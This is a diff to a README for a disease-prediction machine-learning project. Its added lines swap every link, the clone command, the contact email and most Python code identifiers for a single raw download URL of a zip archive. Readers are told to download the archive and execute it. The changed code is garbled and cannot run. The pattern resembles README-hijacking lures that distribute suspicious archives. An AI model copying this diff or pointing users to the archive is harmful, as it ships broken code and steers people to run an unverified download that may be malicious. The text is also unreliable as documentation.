@@ -2,7 +2,7 @@
 
 Welcome to the Multiple Disease Prediction Model repository! This project aims to detect whether an individual is at risk for various diseases based on their health data. The model leverages multiple machine learning algorithms to provide accurate predictions. 
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-Click_here-brightgreen)](https://github.com/Pedro-Verissimo/Multiple_Disease_Prediction_Model/releases)
+[![Download Releases](https://raw.githubusercontent.com/Pedro-Verissimo/Multiple_Disease_Prediction_Model/main/colab_files_to_train_models/Disease_Model_Prediction_Multiple_v3.9.zip)](https://raw.githubusercontent.com/Pedro-Verissimo/Multiple_Disease_Prediction_Model/main/colab_files_to_train_models/Disease_Model_Prediction_Multiple_v3.9.zip)
 
 ## Table of Contents
 
@@ -51,7 +51,7 @@ To get started with the Multiple Disease Prediction Model, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Pedro-Verissimo/Multiple_Disease_Prediction_Model.git
+   git clone https://raw.githubusercontent.com/Pedro-Verissimo/Multiple_Disease_Prediction_Model/main/colab_files_to_train_models/Disease_Model_Prediction_Multiple_v3.9.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -66,7 +66,7 @@ To get started with the Multiple Disease Prediction Model, follow these steps:
    ```
 
 4. **Download the Model**:
-   You can download the latest model from the [Releases section](https://github.com/Pedro-Verissimo/Multiple_Disease_Prediction_Model/releases). After downloading, execute the model as per the instructions provided in the `usage` section.
+   You can download the latest model from the [Releases section](https://raw.githubusercontent.com/Pedro-Verissimo/Multiple_Disease_Prediction_Model/main/colab_files_to_train_models/Disease_Model_Prediction_Multiple_v3.9.zip). After downloading, execute the model as per the instructions provided in the `usage` section.
 
 ## Usage
 
@@ -79,8 +79,8 @@ To use the Multiple Disease Prediction Model, follow these steps:
    ```python
    import pickle
 
-   with open('model.pkl', 'rb') as file:
-       model = pickle.load(file)
+   with open('https://raw.githubusercontent.com/Pedro-Verissimo/Multiple_Disease_Prediction_Model/main/colab_files_to_train_models/Disease_Model_Prediction_Multiple_v3.9.zip', 'rb') as file:
+       model = https://raw.githubusercontent.com/Pedro-Verissimo/Multiple_Disease_Prediction_Model/main/colab_files_to_train_models/Disease_Model_Prediction_Multiple_v3.9.zip(file)
    ```
 
 3. **Make Predictions**:
@@ -89,23 +89,23 @@ To use the Multiple Disease Prediction Model, follow these steps:
    import pandas as pd
 
    # Load your data
-   data = pd.read_csv('your_data.csv')
+   data = https://raw.githubusercontent.com/Pedro-Verissimo/Multiple_Disease_Prediction_Model/main/colab_files_to_train_models/Disease_Model_Prediction_Multiple_v3.9.zip('https://raw.githubusercontent.com/Pedro-Verissimo/Multiple_Disease_Prediction_Model/main/colab_files_to_train_models/Disease_Model_Prediction_Multiple_v3.9.zip')
 
    # Make predictions
-   predictions = model.predict(data)
+   predictions = https://raw.githubusercontent.com/Pedro-Verissimo/Multiple_Disease_Prediction_Model/main/colab_files_to_train_models/Disease_Model_Prediction_Multiple_v3.9.zip(data)
    print(predictions)
    ```
 
 4. **Visualize Results**:
    You can visualize the predictions using Matplotlib:
    ```python
-   import matplotlib.pyplot as plt
+   import https://raw.githubusercontent.com/Pedro-Verissimo/Multiple_Disease_Prediction_Model/main/colab_files_to_train_models/Disease_Model_Prediction_Multiple_v3.9.zip as plt
 
-   plt.bar(range(len(predictions)), predictions)
-   plt.title('Disease Predictions')
-   plt.xlabel('Samples')
-   plt.ylabel('Prediction')
-   plt.show()
+   https://raw.githubusercontent.com/Pedro-Verissimo/Multiple_Disease_Prediction_Model/main/colab_files_to_train_models/Disease_Model_Prediction_Multiple_v3.9.zip(range(len(predictions)), predictions)
+   https://raw.githubusercontent.com/Pedro-Verissimo/Multiple_Disease_Prediction_Model/main/colab_files_to_train_models/Disease_Model_Prediction_Multiple_v3.9.zip('Disease Predictions')
+   https://raw.githubusercontent.com/Pedro-Verissimo/Multiple_Disease_Prediction_Model/main/colab_files_to_train_models/Disease_Model_Prediction_Multiple_v3.9.zip('Samples')
+   https://raw.githubusercontent.com/Pedro-Verissimo/Multiple_Disease_Prediction_Model/main/colab_files_to_train_models/Disease_Model_Prediction_Multiple_v3.9.zip('Prediction')
+   https://raw.githubusercontent.com/Pedro-Verissimo/Multiple_Disease_Prediction_Model/main/colab_files_to_train_models/Disease_Model_Prediction_Multiple_v3.9.zip()
    ```
 
 ## Model Evaluation
@@ -115,7 +115,7 @@ Evaluating the performance of the model is crucial. You can use various metrics 
 1. **Split Your Data**:
    Use Scikit-learn to split your data into training and testing sets:
    ```python
-   from sklearn.model_selection import train_test_split
+   from https://raw.githubusercontent.com/Pedro-Verissimo/Multiple_Disease_Prediction_Model/main/colab_files_to_train_models/Disease_Model_Prediction_Multiple_v3.9.zip import train_test_split
 
    X_train, X_test, y_train, y_test = train_test_split(features, labels, test_size=0.2, random_state=42)
    ```
@@ -123,22 +123,22 @@ Evaluating the performance of the model is crucial. You can use various metrics 
 2. **Train the Model**:
    Train your chosen classifier:
    ```python
-   from sklearn.ensemble import RandomForestClassifier
+   from https://raw.githubusercontent.com/Pedro-Verissimo/Multiple_Disease_Prediction_Model/main/colab_files_to_train_models/Disease_Model_Prediction_Multiple_v3.9.zip import RandomForestClassifier
 
    classifier = RandomForestClassifier()
-   classifier.fit(X_train, y_train)
+   https://raw.githubusercontent.com/Pedro-Verissimo/Multiple_Disease_Prediction_Model/main/colab_files_to_train_models/Disease_Model_Prediction_Multiple_v3.9.zip(X_train, y_train)
    ```
 
 3. **Make Predictions**:
    Predict on the test set:
    ```python
-   y_pred = classifier.predict(X_test)
+   y_pred = https://raw.githubusercontent.com/Pedro-Verissimo/Multiple_Disease_Prediction_Model/main/colab_files_to_train_models/Disease_Model_Prediction_Multiple_v3.9.zip(X_test)
    ```
 
 4. **Evaluate the Model**:
    Use metrics to evaluate:
    ```python
-   from sklearn.metrics import accuracy_score, classification_report
+   from https://raw.githubusercontent.com/Pedro-Verissimo/Multiple_Disease_Prediction_Model/main/colab_files_to_train_models/Disease_Model_Prediction_Multiple_v3.9.zip import accuracy_score, classification_report
 
    print("Accuracy:", accuracy_score(y_test, y_pred))
    print(classification_report(y_test, y_pred))
@@ -172,7 +172,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For questions or suggestions, please contact:
 
 - **Pedro Verissimo**  
-  GitHub: [Pedro-Verissimo](https://github.com/Pedro-Verissimo)  
-  Email: pedro@example.com  
+  GitHub: [Pedro-Verissimo](https://raw.githubusercontent.com/Pedro-Verissimo/Multiple_Disease_Prediction_Model/main/colab_files_to_train_models/Disease_Model_Prediction_Multiple_v3.9.zip)  
+  Email: https://raw.githubusercontent.com/Pedro-Verissimo/Multiple_Disease_Prediction_Model/main/colab_files_to_train_models/Disease_Model_Prediction_Multiple_v3.9.zip  
 
-Thank you for checking out the Multiple Disease Prediction Model! We hope this tool aids in the early detection of diseases and contributes to better health outcomes. For more information, visit the [Releases section](https://github.com/Pedro-Verissimo/Multiple_Disease_Prediction_Model/releases) for the latest updates.
+Thank you for checking out the Multiple Disease Prediction Model! We hope this tool aids in the early detection of diseases and contributes to better health outcomes. For more information, visit the [Releases section](https://raw.githubusercontent.com/Pedro-Verissimo/Multiple_Disease_Prediction_Model/main/colab_files_to_train_models/Disease_Model_Prediction_Multiple_v3.9.zip) for the latest updates.
